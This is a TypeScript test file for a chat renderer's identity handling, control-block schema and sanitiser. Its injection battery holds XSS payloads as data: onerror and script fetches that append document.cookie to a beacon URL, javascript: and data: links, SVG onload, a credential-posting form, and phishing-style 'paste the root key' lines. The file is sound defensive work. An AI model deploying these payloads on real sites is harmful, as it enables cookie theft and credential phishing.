/**
 * check-chat-rich.tsx — round 808's unit check AND its injection battery.
 *
 * Three things are under test, in the order of how badly they hurt:
 *
 *  1. THE RENDERER IS INERT. Round 807 established that the current surface
 *     renders script/img/RTL/5 000-char/nested-marker payloads as literal text
 *     with zero requests to injected hosts. Round 808 makes the chat RICH,
 *     which is precisely the change that could have thrown that away. §3 runs
 *     the payload set of `docs/plan/artifacts/phase800/note-injection.cjs`
 *     — plus six new ones that only exist because this round added a control
 *     format — through the REAL renderer and asserts, per payload:
 *
 *       a. it renders (the source's own text is in the output, escaped where
 *          it is markup) — a sanitiser that silently eats the message is not
 *          a pass;
 *       b. no live node: no script/img/iframe/svg/form/link element and no
 *          inline handler attribute survives;
 *       c. NOTHING CAN FETCH: no `src`, no `srcset`, no `<link rel=preload>`.
 *          This is the one round 807 could not have caught, because before
 *          this round a markdown image in an agent message DID load — see the
 *          BEFORE table in rehype-forge-allowlist.ts;
 *       d. no `javascript:` / `data:` / `vbscript:` / protocol-relative URL
 *          reaches an href;
 *       e. the output stays bounded relative to its input.
 *
 *  2. A CONTROL IS A TYPED PAYLOAD, NOT MARKUP (§2). The schema is closed:
 *     unknown kind, missing field, oversize string, 500 options, a `forge:ui`
 *     block nested inside a normal code fence — each has one right answer, and
 *     "silently render nothing" is never it.
 *
 *  3. IDENTITY IS READ, NOT GUESSED (§1). `meta.comms` decides who a line is
 *     from; a malformed one is NOT a comms entry rather than an entry with a
 *     borrowed identity. The role→ink map is asserted to agree with the panel's
 *     `roleTokenName` for the five roles both colour.
 *
 * vitest is not set up in either repo and NFU8 forbids adding one — plain tsx,
 * table-driven, `process.exit(1)` on any mismatch. Same shape as
 * check-thread-mapping.ts, deliberately.
 *
 * Run (needs the JSX tsconfig — see tsconfig.checks.json at the repo root,
 * whose header says why it cannot live in this directory):
 *   cd forge-control-web && ../forge-control/node_modules/.bin/tsx \
 *     --tsconfig ../tsconfig.checks.json \
 *     ../scripts/checks/check-chat-rich.tsx
 */

import { renderToStaticMarkup } from "react-dom/server";

import { roleTokenName } from "../../forge-control-web/app/desktop/live/agentsApi.ts";
import { tokens } from "../../forge-control-web/app/tokens.ts";
import {
  ROLE_INK_SHARED_WITH_PANEL,
  ROLE_INK_SOURCE,
  TRANSCRIPT_ROLES,
  commsHeader,
  inkAgreesWithPanel,
  readComms,
  roleIdentity,
  shortRunId,
  stripCommsPrefix,
} from "../../forge-control-web/app/desktop/chat/comms-identity.ts";
import {
  LIMITS,
  parseUiBlock,
  sanitizeControlText,
  splitRichSegments,
} from "../../forge-control-web/app/desktop/chat/rich-blocks.ts";
import { safeHref } from "../../forge-control-web/app/desktop/chat/rehype-forge-allowlist.ts";
import { RichMessage } from "../../forge-control-web/app/desktop/chat/RichMessage.tsx";
import { mapThreadToMessages } from "../../forge-control-web/app/desktop/chat/thread-mapping.ts";
import type { ThreadEntry } from "../../forge-control-web/app/api.ts";

let failures = 0;
let assertions = 0;

function check(name: string, actual: unknown, expected: unknown): void {
  assertions++;
  const ok = Object.is(actual, expected);
  if (!ok) failures++;
  console.log(
    `${ok ? "PASS" : "FAIL"}  ${name}` +
      (ok
        ? ""
        : `\n        expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)}`),
  );
}

function checkDeep(name: string, actual: unknown, expected: unknown): void {
  check(name, JSON.stringify(actual), JSON.stringify(expected));
}

/** Render a message exactly as the transcript does. No actions are provided,
 *  which is also the drilled-view case: controls must come out disabled. */
function render(source: string): string {
  return renderToStaticMarkup(<RichMessage source={source} />);
}

/* ========================================================================== *
 * 1. Identity — who a line is from
 * ========================================================================== */

console.log("── §1 comms identity ──");

check(
  "a worker report is read off meta.comms",
  JSON.stringify(
    readComms({
      comms: {
        direction: "in",
        from: "worker",
        peer_run_id: "c8bc5ffa-f63e-4f11-af27-39e3c8fb9e2f",
        peer_role: "builder",
      },
    }),
  ),
  JSON.stringify({
    direction: "in",
    from: "worker",
    peerRunId: "c8bc5ffa-f63e-4f11-af27-39e3c8fb9e2f",
    peerRole: "builder",
    subagentId: null,
  }),
);

/* Every one of these must read as "not comms" rather than as a comms entry
 * with a default identity — a malformed meta must never let a line borrow a
 * worker's colour. */
for (const [label, meta] of [
  ["null meta", null],
  ["a string meta", "comms"],
  ["no comms key", { tool: "Bash" }],
  ["comms is a string", { comms: "worker" }],
  ["direction outside the vocabulary", { comms: { direction: "sideways", from: "worker" } }],
  ["from outside the vocabulary", { comms: { direction: "in", from: "attacker" } }],
  ["from missing entirely", { comms: { direction: "in", peer_run_id: "x" } }],
] as Array<[string, unknown]>) {
  check(`rejected: ${label}`, readComms(meta), null);
}

check(
  "a pre-808 entry has no peer_role and says so",
  readComms({ comms: { direction: "in", from: "worker", peer_run_id: "abc" } })?.peerRole,
  null,
);
check(
  "an empty peer_role is not a role",
  readComms({ comms: { direction: "in", from: "worker", peer_role: "" } })?.peerRole,
  null,
);

console.log("   — the role palette —");
for (const role of TRANSCRIPT_ROLES) {
  const identity = roleIdentity(role);
  check(`${role}: label is its own name`, identity.label, role);
  check(
    `${role}: tint is a token, not a literal`,
    /^var\(--fg-roleBg[A-Z]/.test(identity.bg),
    true,
  );
  check(
    `${role}: ink is a token, not a literal`,
    /^var\(--fg-roleInk[A-Z]/.test(identity.ink),
    true,
  );
}

for (const role of ROLE_INK_SHARED_WITH_PANEL) {
  check(
    `${role}: ink agrees with the panel's roleTokenName ("${roleTokenName(role)}")`,
    inkAgreesWithPanel(role),
    true,
  );
}
check(
  "scout deliberately differs from the panel (textMuted2 fails AA as text)",
  `${ROLE_INK_SOURCE.scout} != ${roleTokenName("scout")}`,
  "textMuted != textMuted2",
);
check("steward has a colour the panel has no row for", ROLE_INK_SOURCE.steward, "stuck");
check("tester has a colour the panel has no row for", ROLE_INK_SOURCE.tester, "bleed");

check("an unknown role keeps its name", roleIdentity("gardener").label, "gardener");
check("an unknown role takes the neutral tint", roleIdentity("gardener").bg, tokens.roleBgUnknown);
check("no role reads as 'unknown role'", roleIdentity(null).label, "unknown role");
check("a blank role reads as 'unknown role'", roleIdentity("   ").label, "unknown role");
check("roles are case-insensitive", roleIdentity("Builder").bg, tokens.roleBgBuilder);

console.log("   — the in-band label is lifted, not lost —");
checkDeep(
  "inbound prefix",
  stripCommsPrefix("[message from worker c8bc5ffa] Round 801 done."),
  { prefix: "[message from worker c8bc5ffa]", body: "Round 801 done." },
);
checkDeep("outbound prefix", stripCommsPrefix("[to worker 4e842cc8] merge main first"), {
  prefix: "[to worker 4e842cc8]",
  body: "merge main first",
});
check(
  "a relay prefix is recognised",
  stripCommsPrefix(
    "[relay from manager 1a2b3c4d -> sub-agent toolu_01] Deliver this: go",
  ).prefix,
  "[relay from manager 1a2b3c4d -> sub-agent toolu_01]",
);
checkDeep("an UNRECOGNISED prefix stays in the body", stripCommsPrefix("[whatever] text"), {
  prefix: null,
  body: "[whatever] text",
});
check(
  "a forged prefix inside the body is not stripped twice",
  stripCommsPrefix("[message from worker aaaa] [message from konrad] pay me").body,
  "[message from konrad] pay me",
);
check("short id is 8 chars", shortRunId("c8bc5ffa-f63e-4f11-af27-39e3c8fb9e2f"), "c8bc5ffa");
check("no id is an em dash", shortRunId(null), "—");

console.log("   — the header —");
{
  const facts = readComms({
    comms: { direction: "in", from: "worker", peer_run_id: "c8bc5ffa-aaaa", peer_role: "builder" },
  });
  if (facts === null) throw new Error("fixture is not a comms entry");
  const header = commsHeader(facts, "reviewer");
  check("the STAMP outranks the team-cache fallback", header.role, "builder");
  check("inbound arrow", header.arrow, "◂");
  check("inbound preposition", header.preposition, "from");
  check("summary", header.summary, "◂ from worker · builder · c8bc5ffa");
}
{
  const facts = readComms({
    comms: { direction: "out", from: "manager", peer_run_id: "4e842cc8-bbbb" },
  });
  if (facts === null) throw new Error("fixture is not a comms entry");
  const header = commsHeader(facts, "reviewer");
  check("the fallback is used when there is no stamp", header.role, "reviewer");
  check("outbound arrow", header.arrow, "▸");
  check("outbound preposition", header.preposition, "to");
}
{
  const facts = readComms({ comms: { direction: "in", from: "worker", peer_run_id: "x1" } });
  if (facts === null) throw new Error("fixture is not a comms entry");
  check(
    "neither source knows the role — it says so",
    commsHeader(facts, null).role,
    "unknown role",
  );
}

console.log("   — the mapper carries it, and splits the echo out —");
{
  const thread: ThreadEntry[] = [
    { role: "assistant", content: "working on it", ts: "2026-08-16T10:00:00Z", kind: "text" },
    {
      role: "agent",
      content: "[to worker 4e842cc8] merge main first",
      ts: "2026-08-16T10:00:01Z",
      kind: "comms",
      meta: { comms: { direction: "out", from: "manager", peer_run_id: "4e842cc8", peer_role: "builder" } },
    },
    { role: "assistant", content: "and now this", ts: "2026-08-16T10:00:02Z", kind: "text" },
    {
      role: "user",
      content: "[message from worker 4e842cc8] done",
      ts: "2026-08-16T10:00:03Z",
      kind: "comms",
      meta: { comms: { direction: "in", from: "worker", peer_run_id: "4e842cc8", peer_role: "builder" } },
    },
    { role: "user", content: "thanks", ts: "2026-08-16T10:00:04Z" },
  ];
  const messages = mapThreadToMessages(thread) as Array<{
    role: string;
    metadata?: { custom?: { comms?: { direction?: string } } };
  }>;
  check("the echo is its OWN message, not merged into the prose", messages.length, 5);
  check("prose before the echo", messages[0].metadata?.custom?.comms, undefined);
  check("the echo carries its direction", messages[1].metadata?.custom?.comms?.direction, "out");
  check("prose after the echo is its own message again", messages[2].role, "assistant");
  check("the inbound report carries its direction", messages[3].metadata?.custom?.comms?.direction, "in");
  check("Konrad's own message carries no comms metadata", messages[4].metadata, undefined);
}

/* ========================================================================== *
 * 2. Controls — a closed schema, and what happens when it is violated
 * ========================================================================== */

console.log("\n── §2 forge:ui control blocks ──");

const CHOICE = `pick one:

\`\`\`forge:ui
{"kind":"choice","id":"host","prompt":"Which host?","options":[{"value":"vps1","label":"VPS1","hint":"65.108.6.149"},"vps2"]}
\`\`\`

after`;

{
  const segments = splitRichSegments(CHOICE);
  check("prose / control / prose", segments.map((s) => s.kind).join(","), "markdown,ui,markdown");
  const block = segments[1].kind === "ui" ? segments[1].block : null;
  check("kind", block?.kind, "choice");
  if (block?.kind === "choice") {
    check("two options", block.options.length, 2);
    check("an object option keeps its label", block.options[0].label, "VPS1");
    check("an object option keeps its hint", block.options[0].hint, "65.108.6.149");
    check("a bare string option is allowed", block.options[1].value, "vps2");
    check("a bare string option labels itself", block.options[1].label, "vps2");
    check("single-select by default", block.multiple, false);
  }
}

check(
  "a forge:ui block INSIDE a normal code fence is prose, not a control",
  splitRichSegments("```\n```forge:ui\n{\"kind\":\"choice\"}\n```\n").map((s) => s.kind).join(","),
  "markdown",
);
check(
  "an unterminated control block is reported, not rendered",
  splitRichSegments('```forge:ui\n{"kind":"choice"}')[0]?.kind,
  "invalid",
);

console.log("   — validation table —");
const BAD: Array<[string, string]> = [
  ["not JSON at all", "{kind: choice}"],
  ["an array, not an object", '["choice"]'],
  ["no kind", '{"options":["a"]}'],
  ["unknown kind", '{"kind":"iframe","src":"http://evil.example"}'],
  ["choice with no options", '{"kind":"choice"}'],
  ["choice with an empty option list", '{"kind":"choice","options":[]}'],
  ["choice with an empty option value", '{"kind":"choice","options":[""]}'],
  [
    "too many options",
    `{"kind":"choice","options":[${Array.from({ length: LIMITS.options + 1 }, (_, i) => `"o${i}"`).join(",")}]}`,
  ],
  [
    "an oversize label",
    `{"kind":"choice","options":[{"value":"v","label":"${"L".repeat(LIMITS.labelChars + 1)}"}]}`,
  ],
  ["a non-string option value", '{"kind":"choice","options":[{"value":42}]}'],
  ["multiple is not a boolean", '{"kind":"choice","multiple":"yes","options":["a"]}'],
  ["an id with illegal characters", '{"kind":"choice","id":"a b/../c","options":["a"]}'],
  ["a secret with no name", '{"kind":"secret"}'],
  ["a secret name with a path in it", '{"kind":"secret","name":"../../etc/passwd"}'],
  ["a secret name with a scheme in it", '{"kind":"secret","name":"javascript:alert(1)"}'],
  ["an oversize block", `{"kind":"choice","options":["${"x".repeat(LIMITS.blockChars)}"]}`],
];
for (const [label, raw] of BAD) {
  const result = parseUiBlock(raw);
  check(`rejected: ${label}`, result.ok, false);
}

check("a valid secret block parses", parseUiBlock('{"kind":"secret","name":"vps2_deploy_key"}').ok, true);
{
  const parsed = parseUiBlock('{"kind":"secret","name":"vps2_key","why":"rsync leg"}');
  check(
    "a secret block carries no value field, ever",
    parsed.ok && parsed.block.kind === "secret" && !("value" in parsed.block),
    true,
  );
}

console.log("   — control characters in a control —");
check(
  "an RTL override in a BUTTON label is replaced, not rendered",
  sanitizeControlText("cancel ‮gnp.yolped"),
  "cancel �gnp.yolped",
);
check("a NUL is replaced", sanitizeControlText("a b"), "a�b");
check("ordinary text is untouched", sanitizeControlText("deploy to vps2"), "deploy to vps2");
check(
  "a newline inside a label survives (it is not a control character here)",
  sanitizeControlText("two\nlines"),
  "two\nlines",
);

console.log("   — the rendered control —");
{
  const html = render(CHOICE);
  check("the choice renders a button", html.includes("<button"), true);
  check('the block is marked data-forge-ui="choice"', html.includes('data-forge-ui="choice"'), true);
  check("the option label is present", html.includes("VPS1"), true);
  check(
    "with no actions the controls are DISABLED, not silently inert",
    (html.match(/<button[^>]*disabled/g) ?? []).length >= 2,
    true,
  );
  check("and they say why", html.includes("read-only here"), true);
  check("no handler attribute is serialised", /\son[a-z]+=/.test(html), false);
}
{
  const html = render('```forge:ui\n{"kind":"choice","options":[{"value":"<img src=x onerror=alert(1)>"}]}\n```');
  check("a hostile option value is escaped", html.includes("&lt;img src=x onerror=alert(1)&gt;"), true);
  check("...and creates no element", html.includes("<img"), false);
}
{
  const html = render("```forge:ui\n{kind: not json}\n```");
  check("an unreadable block is shown, not swallowed", html.includes("unreadable control block"), true);
  check("...with its reason", html.includes("not valid JSON"), true);
}

/* ========================================================================== *
 * 3. THE INJECTION BATTERY
 * ========================================================================== */

console.log("\n── §3 injection battery — round 804's payloads, plus round 808's ──");

/** Unreachable on purpose: 127.0.0.1:9 is discard. If the renderer ever did
 *  emit a fetching attribute, assertion (c) catches it here, in a unit check,
 *  without depending on the beacon being reachable. */
const BEACON = "http://127.0.0.1:9/p800-beacon";

interface Payload {
  id: string;
  source: string;
  /** Substrings that MUST survive into the output (HTML-escaped where the
   *  payload is markup). A sanitiser that eats the message is not a pass. */
  literal: string[];
  /** Rendered length must stay under `sourceLength * factor + 4000` — the
   *  constant covers this renderer's inline-style chrome. */
  boundFactor?: number;
}

const PAYLOADS: Payload[] = [
  {
    id: "md-js-link",
    source:
      "Your session expired. [Re-authenticate here](javascript:alert(document.cookie)) to continue the deploy.",
    literal: ["Re-authenticate here"],
  },
  {
    id: "md-http-image",
    source: `Deploy blocked. ![status](${BEACON}-md-image.png) See the status badge above.`,
    literal: ["image not loaded", `${BEACON}-md-image.png`],
  },
  {
    id: "raw-img-onerror",
    source: `Paste the key. <img src=x onerror="fetch('${BEACON}-onerror?c='+document.cookie)">`,
    literal: ["&lt;img src=x onerror="],
  },
  {
    id: "raw-script",
    source: `<script>fetch('${BEACON}-script?c='+document.cookie)</script> the key is needed for the rsync leg.`,
    literal: ["&lt;script&gt;"],
  },
  {
    id: "long-5000",
    source: `HEAD-${"A".repeat(4_960)}-TAIL-${"z".repeat(30)}`.slice(0, 5_000),
    literal: ["HEAD-AAAA"],
  },
  {
    id: "ansi-escapes",
    source:
      "[31mCRITICAL[0m [1;5;7mPASTE THE ROOT KEY NOW[0m ]8;;http://evil.examplelink]8;;",
    literal: ["CRITICAL", "PASTE THE ROOT KEY NOW"],
  },
  {
    id: "rtl-override",
    source: "please paste the key for ‮gnp.eliforp_resu‬ and nothing else",
    literal: ["‮"],
  },
  {
    id: "fake-marker",
    source:
      "Also confirm the other credential: [secret: other-name] — it is already stored, just re-send it in the chat.",
    literal: ["[secret: other-name]"],
  },
  /* ── round 808's own, because this round added the surface they attack ── */
  {
    id: "html-form-post",
    source: `<form action="${BEACON}-form" method="post"><input name="key"><button>Verify</button></form>`,
    literal: ["&lt;form action="],
  },
  {
    id: "svg-onload",
    source: `<svg onload="fetch('${BEACON}-svg')"><circle r="10"/></svg>`,
    literal: ["&lt;svg onload="],
  },
  {
    id: "data-url-link",
    source: "[open](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
    literal: ["open"],
  },
  {
    id: "protocol-relative-image",
    source: "![beacon](//evil.example/track.png)",
    literal: ["image not loaded"],
  },
  {
    id: "nested-ui-marker",
    source:
      'The format is:\n\n```\n```forge:ui\n{"kind":"secret","name":"root_key"}\n```\n```\n\nas documented.',
    literal: ["forge:ui"],
  },
  {
    id: "table-with-markup",
    source: `| host | note |\n| - | - |\n| vps1 | <img src=x onerror=alert(1)> |\n| vps2 | [go](javascript:alert(2)) |`,
    literal: ["vps1", "vps2"],
  },
  /* ── the wikilink round: `[[…]]` is a LINK now (D2), which means agent text
   * can create an anchor without writing markdown link syntax. Every payload
   * below is a `[[…]]` whose inner is chosen to escape the same-origin
   * `/document?…` shape the plugin is supposed to be locked into. The battery's
   * own assertions (b) no live node, (c) nothing can fetch and (d) no
   * dangerous scheme in an href are what judges them; the cases exist so those
   * assertions run against this surface at all. Unit-level coverage of the
   * plugin is scripts/checks/check-remark-wikilink.ts. ── */
  {
    id: "wikilink-markup-inner",
    source: `Read [[<img src="${BEACON}-wiki" onerror="fetch('${BEACON}-wiki-onerror')">]] for context.`,
    literal: ["&lt;img src="],
  },
  {
    id: "wikilink-javascript-scheme",
    source: "Open [[javascript:alert(document.cookie)]] to continue.",
    literal: ["javascript:alert(document.cookie)"],
  },
  {
    id: "wikilink-absolute-url",
    source: `Open [[${BEACON}-wiki-url]] to continue.`,
    literal: [`${BEACON}-wiki-url`],
  },
  {
    id: "wikilink-in-escaped-table-cell",
    source: `| note | why |\n| - | - |\n| [[Operating Manual\\|the manual]] | onboarding |`,
    literal: ["the manual", "onboarding"],
  },
];

/**
 * THE TAGS ONLY — and this distinction is the whole assertion.
 *
 * A payload that renders correctly appears in the output as ESCAPED TEXT:
 * `&lt;img src=x onerror=…&gt;`. That string contains the characters "src=" and
 * "onerror=", so a regex over the raw HTML reports a hit on a payload that is
 * inert — which is exactly the false pass/fail that would make this battery
 * worthless in both directions. Escaped text has no `<`, so it cannot be
 * inside a tag; slicing the output to its tags is the string-level equivalent
 * of round 804's `panel.querySelectorAll("img[onerror]")`.
 */
function tagsOf(html: string): string {
  return (html.match(/<[^>]*>/g) ?? []).join(" ");
}

/** Attributes and elements that would make the browser fetch or execute. */
const LIVE_NODE = /<(script|iframe|object|embed|form|svg|math|link|style|base|meta|audio|video|canvas)\b/i;
const HANDLER = /\s(on[a-z]+)\s*=/i;
const FETCHING_ATTR = /\s(src|srcset|poster|data|action|formaction|background)\s*=/i;
const BAD_SCHEME_HREF = /href\s*=\s*"(?:\s|&#\d+;)*(javascript|data|vbscript|file):/i;
const PROTOCOL_RELATIVE_HREF = /href\s*=\s*"\/\//i;

/* ── NEGATIVE CONTROL ──────────────────────────────────────────────────────
 * Every assertion below is of the form "this pattern is NOT present", and a
 * broken instrument passes all of them. So first: feed the instrument markup
 * that IS hostile and require it to fire. If these four ever go quiet, the
 * fourteen payloads underneath are proving nothing. */
{
  const hostile = '<p>x</p><img src="http://evil.example/b.png" onerror="alert(1)"><a href="javascript:alert(1)">go</a><iframe src="//evil.example"></iframe>';
  const tags = tagsOf(hostile);
  check("control — the instrument sees a live element", LIVE_NODE.test(tags), true);
  check("control — the instrument sees an inline handler", HANDLER.test(tags), true);
  check("control — the instrument sees a fetching attribute", FETCHING_ATTR.test(tags), true);
  check("control — the instrument sees a javascript: href", BAD_SCHEME_HREF.test(tags), true);
  check(
    "control — and ESCAPED markup does not trip it (the false positive this avoids)",
    HANDLER.test(tagsOf("&lt;img src=x onerror=alert(1)&gt;")),
    false,
  );
}

for (const payload of PAYLOADS) {
  const html = render(payload.source);
  const tags = tagsOf(html);
  const id = payload.id;

  const missing = payload.literal.filter((needle) => !html.includes(needle));
  check(`${id} — a. renders (nothing swallowed)`, missing.join("|"), "");
  check(`${id} — b1. no live element`, LIVE_NODE.test(tags), false);
  check(`${id} — b2. no inline handler`, HANDLER.test(tags), false);
  check(`${id} — c. nothing that fetches`, FETCHING_ATTR.test(tags), false);
  check(
    `${id} — d. no javascript:/data:/vbscript:/protocol-relative href`,
    BAD_SCHEME_HREF.test(tags) || PROTOCOL_RELATIVE_HREF.test(tags),
    false,
  );
  const bound = payload.source.length * (payload.boundFactor ?? 3) + 4_000;
  check(`${id} — e. output is bounded (${html.length} < ${bound})`, html.length < bound, true);
}

console.log("   — the URL gate itself —");
const URLS: Array<[string, boolean]> = [
  ["https://anthropic.com", true],
  ["http://127.0.0.1:7700/api/health", true],
  ["mailto:konrad@example.com", true],
  ["#section", true],
  ["/desktop", true],
  ["javascript:alert(1)", false],
  ["JaVaScRiPt:alert(1)", false],
  ["java\tscript:alert(1)", false],
  [" javascript:alert(1)", false],
  [" javascript:alert(1)", false],
  ["data:text/html,<script>alert(1)</script>", false],
  ["vbscript:msgbox(1)", false],
  ["//evil.example/x", false],
  ["", false],
];
for (const [url, allowed] of URLS) {
  check(`safeHref(${JSON.stringify(url)})`, safeHref(url) !== null, allowed);
}

console.log("   — a legitimate rich message still renders richly —");
{
  const html = render(
    "## Round 808\n\n- **bold** and `code`\n- a [link](https://anthropic.com)\n\n| a | b |\n| - | - |\n| 1 | 2 |\n\n```bash\necho hi\n```\n",
  );
  for (const [what, needle] of [
    ["heading", "<h2"],
    ["list", "<ul"],
    ["bold", "<strong"],
    ["inline code", "<code"],
    ["table", "<table"],
    ["code block", "<pre"],
    ["link", 'href="https://anthropic.com"'],
    ["rel on the link", 'rel="noopener noreferrer nofollow"'],
  ] as Array<[string, string]>) {
    check(`${what} survives the allowlist`, html.includes(needle), true);
  }
  check("no raw colour literal in the rendered chrome", /#[0-9a-f]{6}/i.test(html), false);
}

/* ========================================================================== */

console.log(
  `\n${failures === 0 ? "PASS" : "FAIL"} — ${assertions - failures}/${assertions} assertions`,
);
if (failures > 0) process.exit(1);
